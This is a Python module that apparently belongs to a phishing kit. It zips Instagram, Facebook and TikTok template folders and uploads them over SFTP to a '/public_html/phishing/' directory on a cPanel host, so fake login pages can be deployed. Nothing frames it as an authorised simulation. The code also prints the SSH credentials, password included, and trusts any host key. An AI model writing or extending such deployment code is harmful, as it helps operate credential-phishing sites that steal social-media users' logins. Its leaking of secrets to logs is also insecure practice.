import os
import zipfile
import paramiko
from datetime import datetime

class FileHandler:
    def __init__(self):
        # Get the project root directory
        self.project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        self.base_path = os.path.join(self.project_root, 'templates')
        self.social_folders = {
            'instagram': os.path.join(self.base_path, 'instagram'),
            'facebook': os.path.join(self.base_path, 'facebook'),
            'tiktok': os.path.join(self.base_path, 'tiktok')
        }

    def create_zip(self, social_media):
        social_media = social_media.lower()
        if social_media not in self.social_folders:
            raise ValueError("Invalid social media platform")

        source_dir = self.social_folders[social_media]
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        zip_filename = f'{social_media}_{timestamp}.zip'
        zip_path = os.path.join(self.project_root, 'temp', zip_filename)

        # Ensure temp directory exists
        os.makedirs(os.path.dirname(zip_path), exist_ok=True)

        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(source_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, source_dir)
                    zipf.write(file_path, arcname)

        return zip_path

    def upload_to_cpanel(self, zip_path, ssh_credentials):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            print(f"SSH: {ssh_credentials}")
            ssh.connect(
                hostname=ssh_credentials['hostname'],
                username=ssh_credentials['username'],
                password=ssh_credentials['password'],
                port=ssh_credentials['port']
            )

            sftp = ssh.open_sftp()
            remote_path = f'/public_html/phishing/{os.path.basename(zip_path)}'
            sftp.put(zip_path, remote_path)
            
            sftp.close()
            ssh.close()
            
            # Clean up the local zip file after successful upload
            os.remove(zip_path)
            
            return remote_path
        except Exception as e:
            raise Exception(f"Failed to upload file: {str(e)}")